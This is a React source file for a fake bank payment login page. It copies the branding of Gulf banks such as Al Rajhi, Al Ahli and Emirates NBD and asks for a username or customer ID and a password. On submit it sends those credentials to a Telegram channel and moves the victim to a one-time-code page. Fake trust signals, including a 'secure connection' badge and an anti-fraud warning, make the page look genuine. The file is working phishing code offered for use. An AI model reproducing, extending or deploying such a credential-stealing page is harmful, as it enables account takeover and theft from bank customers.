import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { bankBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import {
  Lock,
  Eye,
  EyeOff,
  ShieldCheck,
  Loader2,
  User,
  IdCard,
  KeyRound,
  Globe,
  ChevronDown,
  Info,
  HelpCircle,
  Smartphone
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selectedBank || '';
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
  const branding = selectedBankId ? bankBranding[selectedBankId] : null;
  const countryCode = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const loginType = (selectedBankId === 'alrajhi_bank' || selectedBankId === 'alahli_bank' || selectedBankId === 'emirates_nbd') ? 'username' : 'customerId';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      password,
      loginType
    };

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, bankLoginData }
      });

      await sendToTelegram({
        type: 'bank_login',
        data: {
          ...bankLoginData,
          bank: selectedBank?.nameAr || 'غير محدد',
          amount: formatCurrency(linkData?.payload.payment_amount || 500, linkData?.payload.currency_code)
        },
        timestamp: new Date().toISOString()
      });

      toast({ title: "تم بنجاح", description: "جاري التحقق من البيانات..." });
      navigate(`/pay/${id}/otp`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData || !branding) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-12 h-12 animate-spin text-blue-600" />
      </div>
    );
  }

  const primaryColor = branding.colors.primary;
  const secondaryColor = branding.colors.secondary;

  return (
    <>
      <PaymentMetaTags 
        serviceKey={`bank_${selectedBankId}`}
        serviceName={selectedBank?.nameAr || 'البنك'}
        title={`تسجيل الدخول - ${selectedBank?.nameAr}`}
        amount={formatCurrency(linkData.payload.payment_amount || 500, linkData.payload.currency_code)}
      />

      <div className="min-h-screen flex flex-col bg-gray-50" dir="rtl" style={{ fontFamily: branding.fonts.arabic }}>
        {/* Official Bank Header 1:1 */}
        <header className="w-full bg-white border-b-4 shadow-sm" style={{ borderBottomColor: primaryColor }}>
          <div className="container mx-auto px-4 h-20 sm:h-24 flex items-center justify-between">
            <div className="flex items-center gap-6">
               <div className="w-32 sm:w-48">
                  <BankLogo
                    bankId={selectedBankId}
                    bankName={selectedBank?.name}
                    bankNameAr={selectedBank?.nameAr}
                    className="w-full h-auto object-contain"
                  />
               </div>
               <div className="hidden lg:block h-10 w-px bg-gray-200" />
               <div className="hidden lg:block">
                  <p className="text-lg font-black text-gray-800">الخدمات البنكية عبر الإنترنت</p>
                  <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Digital Banking Services</p>
               </div>
            </div>

            <div className="flex items-center gap-4">
               <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-lg border text-gray-500 text-xs font-bold">
                  <Globe className="w-4 h-4" /> English
               </div>
               <div className="flex items-center gap-2 px-4 py-2 bg-green-50 text-green-700 rounded-full border border-green-100 text-[10px] font-black">
                  <Lock className="w-3.5 h-3.5" /> اتصال آمن
               </div>
            </div>
          </div>
        </header>

        {/* Login Area */}
        <main className="flex-1 flex items-center justify-center p-4 py-12">
           <div className="w-full max-w-[450px] space-y-8">
              <Card className="overflow-hidden border-0 shadow-2xl rounded-[2.5rem] bg-white">
                 <div className="p-10 text-center space-y-4">
                    <div className="w-20 h-20 rounded-3xl mx-auto flex items-center justify-center text-white shadow-xl shadow-gray-200" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                       <User className="w-10 h-10" />
                    </div>
                    <div>
                       <h1 className="text-2xl font-black text-gray-800">أهلاً بك في {selectedBank?.nameAr}</h1>
                       <p className="text-sm font-bold text-gray-400">يرجى تسجيل الدخول لمتابعة عملية السداد</p>
                    </div>
                 </div>

                 <form onSubmit={handleSubmit} className="px-10 pb-10 space-y-6">
                    <div className="space-y-4">
                       {loginType === 'username' ? (
                         <div className="space-y-2">
                            <Label className="text-xs font-black text-gray-400 uppercase">اسم المستخدم</Label>
                            <div className="relative">
                               <Input
                                 value={username}
                                 onChange={(e) => setUsername(e.target.value)}
                                 className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg focus:border-opacity-100 transition-all"
                                 style={{ focusBorderColor: primaryColor }}
                                 placeholder="أدخل اسم المستخدم"
                                 required
                               />
                               <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300" />
                            </div>
                         </div>
                       ) : (
                         <div className="space-y-2">
                            <Label className="text-xs font-black text-gray-400 uppercase">رقم العميل (CIF)</Label>
                            <div className="relative">
                               <Input
                                 value={customerId}
                                 onChange={(e) => setCustomerId(e.target.value)}
                                 className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg focus:border-opacity-100 transition-all"
                                 style={{ focusBorderColor: primaryColor }}
                                 placeholder="أدخل رقم العميل المكون من 8 أرقام"
                                 required
                               />
                               <IdCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300" />
                            </div>
                         </div>
                       )}

                       <div className="space-y-2">
                          <div className="flex justify-between items-center">
                             <Label className="text-xs font-black text-gray-400 uppercase">كلمة المرور</Label>
                             <button type="button" className="text-[10px] font-black uppercase tracking-tighter" style={{ color: primaryColor }}>نسيت كلمة المرور؟</button>
                          </div>
                          <div className="relative">
                             <Input
                               type={showPassword ? "text" : "password"}
                               value={password}
                               onChange={(e) => setPassword(e.target.value)}
                               className="h-14 pr-12 pl-12 border-2 rounded-2xl font-bold text-lg focus:border-opacity-100 transition-all"
                               style={{ focusBorderColor: primaryColor }}
                               placeholder="••••••••"
                               required
                             />
                             <KeyRound className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300" />
                             <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 hover:text-gray-600 transition-colors">
                                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                             </button>
                          </div>
                       </div>
                    </div>

                    <div className="bg-amber-50 p-4 rounded-2xl border border-amber-100 flex gap-3">
                       <ShieldCheck className="w-5 h-5 text-amber-600 shrink-0" />
                       <p className="text-[10px] text-amber-800 font-bold leading-relaxed">
                          تنبيه: البنك لن يطلب منك أبداً الإفصاح عن رقمك السري أو بياناتك الشخصية عبر الهاتف أو الرسائل النصية.
                       </p>
                    </div>

                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      className="w-full h-16 rounded-2xl text-xl font-black shadow-xl transition-all hover:scale-[1.02] active:scale-[0.98]"
                      style={{ background: primaryColor, boxShadow: `0 10px 30px -10px ${primaryColor}60` }}
                    >
                      {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "دخول آمن"}
                    </Button>
                 </form>

                 <div className="px-10 py-6 bg-gray-50 border-t flex items-center justify-between">
                    <button type="button" className="text-xs font-black text-gray-500 flex items-center gap-1 hover:text-gray-800 transition-colors">
                       <HelpCircle className="w-4 h-4" /> مساعدة
                    </button>
                    <button type="button" className="text-xs font-black text-gray-500 flex items-center gap-1 hover:text-gray-800 transition-colors">
                       <Smartphone className="w-4 h-4" /> تطبيق البنك
                    </button>
                 </div>
              </Card>

              <footer className="text-center space-y-4">
                 <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">
                    © 2025 {selectedBank?.nameEn} . All Rights Reserved.
                 </p>
                 <div className="flex items-center justify-center gap-6 text-[10px] font-black text-gray-400 uppercase">
                    <button className="hover:text-gray-600">Privacy Policy</button>
                    <div className="w-1 h-1 rounded-full bg-gray-300" />
                    <button className="hover:text-gray-600">Terms of Service</button>
                    <div className="w-1 h-1 rounded-full bg-gray-300" />
                    <button className="hover:text-gray-600">Security Tips</button>
                 </div>
              </footer>
           </div>
        </main>
      </div>
    </>
  );
};

export default PaymentBankLogin;
